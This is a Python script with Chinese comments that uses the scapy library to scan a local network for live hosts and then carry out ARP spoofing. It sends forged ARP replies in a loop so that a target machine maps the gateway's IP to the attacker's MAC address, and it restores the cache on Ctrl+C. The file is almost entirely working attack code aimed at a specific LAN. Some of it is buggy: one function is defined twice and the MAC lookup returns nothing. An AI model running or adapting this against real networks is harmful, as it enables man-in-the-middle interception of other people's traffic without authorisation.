#!/usr/bin/env python3
# -.- coding: utf-8 -.-

import signal
from scapy.all import *


def scan_alive_host():
    wifi = 'en0'
    # 模拟发包,向整个网络发包，如果有回应，则表示活跃的主机
    p = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst='192.168.31.0/24')
    # ans表示收到的包的回复
    ans, unans = srp(p, iface=wifi, timeout=2)
    print("一共扫描到%d台主机：" % len(ans))

    # 将需要的IP地址和Mac地址存放在result列表中
    result = []
    for s, r in ans:
        # 解析收到的包，提取出需要的IP地址和MAC地址
        result.append([r[ARP].psrc, r[ARP].hwsrc])
    # 将获取的信息进行排序，看起来更整齐一点
    result.sort()
    # 打印出局域网中的主机
    for ip, mac in result:
        print(ip, '------>', mac)

def arp_spoof():
    # 局域网ARP欺骗
    srploop(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(hwsrc="00:e0:70:52:54:26", psrc="192.168.31.1", op=2))

def get_packet_by_interface():
    # 首先要选择网卡的接口，就需要查看网卡接口有什么,在进行选择
    print(show_interfaces())
    wifi = 'en0'

    # 查看抓取到的数据包
    pkts = sniff(iface=wifi, count=3, filter='arp')
    print(pkts)

def get_mac_by_ip(ip):
    res = sr1(ARP(pdst=ip))
    print('mac: ' + res.hwsrc)

def arp_spoof(ip_1,ip_2,ifname='en0'):
    # 申明全局变量
    global localip, localmac, dst_1_ip , dst_1_mac, dst_2_ip , dst_2_mac , local_ifname

    #赋值到全局变量
    #dst_1_ip为被毒化ARP设备的IP地址，dst_ip_2为本机伪装设备的IP地址
    #local_ifname为攻击者使用的网口名字
    dst_1_ip, dst_2_ip, local_ifname= ip_1, ip_2, ifname

    # 获取本机IP和MAC地址，并且赋值到全局变量
    localip, localmac= local_ip, local_mac

    # 获取被欺骗ip_1的MAC地址，真实网关ip_2的MAC地址
    dst_1_mac, dst_2_mac = get_mac_by_ip(ip_1), get_mac_by_ip(ip_2)

    # 引入信号处理机制，如果出现ctl+c（signal.SIGINT），使用sigint_handler这个方法进行处理
    signal.signal(signal.SIGINT, sigint_handler)

    while True:  # 一直攻击，直到ctl+c出现！！！
        # op=2,响应ARP
        sendp(Ether(src=localmac, dst=dst_1_mac) / ARP(op=2, hwsrc=localmac, hwdst=dst_1_mac, psrc=dst_2_ip, pdst=dst_1_ip),
              iface=intername,
              verbose=False)

        print("发送ARP欺骗数据包！欺骗{} , {}的MAC地址已经是我本机{}的MAC地址啦!!!".format(ip_1,ip_2,ifname))
        time.sleep(1)


# 定义处理方法
def sigint_handler(signum, frame):
    # 申明全局变量
    global localip, localmac, dst_1_ip , dst_1_mac, dst_2_ip , dst_2_mac , local_ifname

    print("\n执行恢复操作！！！")
    # 发送ARP数据包，恢复被毒化设备的ARP缓存
    sendp(Ether(src=dst_2_mac, dst=dst_1_mac) / ARP(op=2, hwsrc=dst_2_mac, hwdst=dst_1_mac, psrc=dst_2_ip, pdst=dst_1_ip),
          iface=intername,
          verbose=False)
    print("已经恢复 {} 的ARP缓存啦".format(dst_1_ip))
    # 退出程序，跳出while True
    sys.exit()

if __name__ == '__main__':

    local_mac = 'a4:83:e7:3a:f3:07'
    local_mac_new = 'a4:83:e7:3a:f3:08'
    dst_addr = "192.168.31.111"
    local_ip = '192.168.31.234'
    intername = 'en0'
    gate_way_ip = '192.168.31.1'
    try:
        # scan_alive_host()

        arp_spoof(dst_addr, gate_way_ip)

        # get_mac_by_ip(dst_addr)

    except AttributeError:
        print(AttributeError.with_traceback())

